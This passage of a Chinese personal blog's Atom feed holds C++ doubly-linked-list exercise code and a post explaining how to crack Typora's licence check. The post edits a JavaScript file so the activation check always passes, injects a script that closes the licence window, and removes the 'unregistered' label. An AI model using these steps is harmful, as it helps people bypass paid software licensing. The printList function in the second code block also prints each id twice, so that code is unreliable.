operator">*</span><span class="token operator">&amp;</span>head<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">bool</span> left<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    node <span class="token operator">*</span>newNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    newNode<span class="token operator">-></span>id <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    newNode<span class="token operator">-></span>prev <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    newNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    node <span class="token operator">*</span>temp <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>left<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>temp<span class="token operator">-></span>id <span class="token operator">!=</span> k<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            temp <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>temp<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            temp<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        newNode<span class="token operator">-></span>next <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>        temp<span class="token operator">-></span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        newNode<span class="token operator">-></span>prev <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>temp<span class="token operator">-></span>id <span class="token operator">!=</span> k<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            temp <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>temp<span class="token operator">-></span>prev <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            head <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            temp<span class="token operator">-></span>prev<span class="token operator">-></span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        newNode<span class="token operator">-></span>prev <span class="token operator">=</span> temp<span class="token operator">-></span>prev<span class="token punctuation">;</span>        temp<span class="token operator">-></span>prev <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        newNode<span class="token operator">-></span>next <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">deleteValue</span><span class="token punctuation">(</span>node <span class="token operator">*</span><span class="token operator">&amp;</span>head<span class="token punctuation">,</span> <span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    node <span class="token operator">*</span>temp <span class="token operator">=</span> head<span class="token punctuation">;</span>    node <span class="token operator">*</span>prior <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> temp<span class="token operator">-></span>id <span class="token operator">==</span> id<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        head <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>        head<span class="token operator">-></span>prev <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span> <span class="token comment">// 这里可要可不要</span>        <span class="token keyword">delete</span> temp<span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token comment">// 删除头节点</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>temp <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> temp<span class="token operator">-></span>id <span class="token operator">!=</span> id<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        prior <span class="token operator">=</span> temp<span class="token punctuation">;</span>        temp <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    prior<span class="token operator">-></span>next <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>    prior<span class="token operator">-></span>prev <span class="token operator">=</span> temp<span class="token operator">-></span>prev<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>        temp<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> prior<span class="token punctuation">;</span>    <span class="token keyword">delete</span> temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">printList</span><span class="token punctuation">(</span>node <span class="token operator">*</span>head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    node <span class="token operator">*</span>temp <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>temp <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> temp<span class="token operator">-></span>id <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        temp <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></details><hr><h3 id="附经典解法哈希-双向链表AC代码。">附经典解法哈希+双向链表AC代码。</h3><p><strong>优化代码，哈希将查找与删除的时间复杂度优化为O(1)，用空间换时间</strong>。</p><details><summary>点击查看代码 </summary><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unordered_map></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> id<span class="token punctuation">;</span>    node <span class="token operator">*</span>prev<span class="token punctuation">;</span>    node <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>node <span class="token operator">*</span><span class="token operator">&amp;</span>head<span class="token punctuation">,</span> <span class="token keyword">int</span> k_id<span class="token punctuation">,</span> <span class="token keyword">int</span> new_id<span class="token punctuation">,</span> <span class="token keyword">bool</span> left<span class="token punctuation">,</span> unordered_map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> node<span class="token operator">*</span><span class="token operator">></span> <span class="token operator">&amp;</span>nodes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    node <span class="token operator">*</span>target <span class="token operator">=</span> nodes<span class="token punctuation">[</span>k_id<span class="token punctuation">]</span><span class="token punctuation">;</span>    node <span class="token operator">*</span>newNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    newNode<span class="token operator">-></span>id <span class="token operator">=</span> new_id<span class="token punctuation">;</span>    newNode<span class="token operator">-></span>prev <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    newNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    nodes<span class="token punctuation">[</span>new_id<span class="token punctuation">]</span> <span class="token operator">=</span> newNode<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>left<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 插入到右侧</span>        newNode<span class="token operator">-></span>prev <span class="token operator">=</span> target<span class="token punctuation">;</span>        newNode<span class="token operator">-></span>next <span class="token operator">=</span> target<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            target<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        target<span class="token operator">-></span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 插入到左侧</span>        newNode<span class="token operator">-></span>next <span class="token operator">=</span> target<span class="token punctuation">;</span>        newNode<span class="token operator">-></span>prev <span class="token operator">=</span> target<span class="token operator">-></span>prev<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token operator">-></span>prev <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            target<span class="token operator">-></span>prev<span class="token operator">-></span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            head <span class="token operator">=</span> newNode<span class="token punctuation">;</span> <span class="token comment">// 更新头节点</span>        <span class="token punctuation">&#125;</span>        target<span class="token operator">-></span>prev <span class="token operator">=</span> newNode<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">deleteNode</span><span class="token punctuation">(</span>node <span class="token operator">*</span><span class="token operator">&amp;</span>head<span class="token punctuation">,</span> <span class="token keyword">int</span> id<span class="token punctuation">,</span> unordered_map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> node<span class="token operator">*</span><span class="token operator">></span> <span class="token operator">&amp;</span>nodes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nodes<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token operator">==</span> nodes<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    node <span class="token operator">*</span>target <span class="token operator">=</span> nodes<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 更新前驱节点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token operator">-></span>prev <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        target<span class="token operator">-></span>prev<span class="token operator">-></span>next <span class="token operator">=</span> target<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        head <span class="token operator">=</span> target<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// 删除的是头节点</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 更新后继节点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        target<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> target<span class="token operator">-></span>prev<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    nodes<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">delete</span> target<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">printList</span><span class="token punctuation">(</span>node <span class="token operator">*</span>head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    node <span class="token operator">*</span>temp <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>temp <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> temp<span class="token operator">-></span>id <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> temp<span class="token operator">-></span>id <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        temp <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    node <span class="token operator">*</span>head <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token operator">-></span>id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    head<span class="token operator">-></span>prev <span class="token operator">=</span> head<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    unordered_map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> node<span class="token operator">*</span><span class="token operator">></span> nodes<span class="token punctuation">;</span>    nodes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> k<span class="token punctuation">,</span> p<span class="token punctuation">;</span>        cin <span class="token operator">>></span> k <span class="token operator">>></span> p<span class="token punctuation">;</span>        <span class="token function">insert</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> k<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> p <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> nodes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cin <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>m<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> id<span class="token punctuation">;</span>        cin <span class="token operator">>></span> id<span class="token punctuation">;</span>        <span class="token function">deleteNode</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> id<span class="token punctuation">,</span> nodes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printList</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 释放内存</span>    node <span class="token operator">*</span>current <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>current<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        node <span class="token operator">*</span>next <span class="token operator">=</span> current<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token keyword">delete</span> current<span class="token punctuation">;</span>        current <span class="token operator">=</span> next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></details><hr>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="数据结构" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="编程" scheme="https://notes.moyuin.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Typora激活成功</title>
    <link href="https://notes.moyuin.top/2025/02/24/sheng-huo/ji-lu/typora-ji-huo-cheng-gong/"/>
    <id>https://notes.moyuin.top/2025/02/24/sheng-huo/ji-lu/typora-ji-huo-cheng-gong/</id>
    <published>2025-02-24T14:05:11.000Z</published>
    <updated>2025-02-24T14:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>Typora激活成功</h1><p>记录typora激活，参考教程是<a href="https://blog.csdn.net/qjkewdmgkq/article/details/139335063">CSDN</a>。<br>苦于一些2022教程里面一些大佬的脚本被Ban掉无法git clone，鉴于CSDN实在是过于恶心（复制要开会员）所以把这个在2025年可以完成的激活教程记录一下。</p><h2 id="找到要修改的js">找到要修改的js</h2><p>之前寻找了很多教程都说Typora的激活是根据一个license的激活是否为true而决定的，所以本地修改那个部分也是完成了后台激活部分。</p><blockquote><p>方法：</p><ul><li>进入…\Typora\resources\page-dist\static\js\LicenseIndex.180dd4c7.4da8909c.chunk.js</li><li>ctrl+F搜索&quot;e.hasActivated=“true”&quot;，将e.hasActivated=“true”==e.hasActivated改为e.hasActivated=“true”==“true”。</li><li>后台激活成功。</li></ul></blockquote><h2 id="关闭启动激活弹窗">关闭启动激活弹窗</h2><blockquote><p>方法：</p><ul><li><p>进入…\Typora\resources\page-dist\license.html</p></li><li><p>定位到最后的</p><p><code>&lt;/body&gt;&lt;/html&gt;</code></p></li><li><p>将其改为</p><p><code>&lt;/body&gt;&lt;script&gt;window.onload=function()&#123;setTimeout(()=&gt;&#123;window.close();&#125;,50000000);&#125;&lt;/script&gt;&lt;/html&gt;</code></p></li></ul></blockquote><p>注意这里的5000000，小一点的数字不行，有data error的问题。</p><h2 id="去除左下角-未激活-提示">去除左下角&quot;未激活&quot;提示</h2><blockquote><p>方法：</p><ul><li>进入…\Typora\resources\locales\zh-Hans.lproj\Panel.json</li><li>ctrl+F搜索&quot;UNREGISTERED&quot;:“未激活”，将其改为&quot;UNREGISTERED&quot;:“”（把未激活三个字删掉即可）。</li></ul></blockquote><h2 id="重新打开Typora">重新打开Typora</h2><p>启动手动关掉激活窗口，之后不再出现。<br><img src="/images/Typora%E6%BF%80%E6%B4%BB%E6%88%90%E5%8A%9F/typora%E6%BF%80%E6%B4%BB.png" alt="激活界面"></p><h2 id="总结">总结</h2><p>我平时用Obsidian写markdown，综合性比Typora高一些，还不收费，不弹出来让你激活的提示，因为文件管理什么的也很方便，还有挺多第三方插件的。<br>那为什么要花那么多时间去找Typora激活？<br>也许是因为Typora界面挺好看的。😹</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="破解" scheme="https://notes.moyuin.top/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
</feed>
